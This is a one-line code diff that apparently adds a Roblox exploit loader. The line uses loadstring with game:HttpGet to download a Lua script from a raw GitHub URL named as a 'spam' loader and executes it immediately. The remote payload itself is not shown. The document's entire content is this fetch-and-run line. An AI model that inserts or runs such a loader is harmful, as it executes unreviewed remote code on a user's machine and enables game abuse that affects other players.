@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/cure-violence-district-spam4-7cn4vokgfzf5z9.lua"))()
